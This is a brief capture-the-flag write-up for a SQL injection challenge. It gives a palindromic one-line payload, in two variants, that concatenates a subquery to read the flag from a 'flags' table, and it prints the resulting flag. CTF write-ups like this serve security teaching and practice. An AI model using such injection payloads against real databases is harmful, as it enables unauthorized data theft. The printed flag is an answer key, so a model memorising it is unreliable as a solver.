### Chall Desc :
Founded in 2022 by me.

### File attached :
[server.py](server.py)
[app.py](app.py)

### Soln :

It is a one-liner payload question using SQl.

Payload : %'||(SELECT flag FROM flags)||'%');---;)'%'||)sgalf MORF galf TCELES(||'%
It will work fine without the percentages as well : `' || (select flag from flags) ); -- ;) )sgalf morf galf tceles( || '`

#### THE FLAG : hope{ecid_gnivlovni_semordnilap_fo_kniht_ton_dluoc}

Thank you
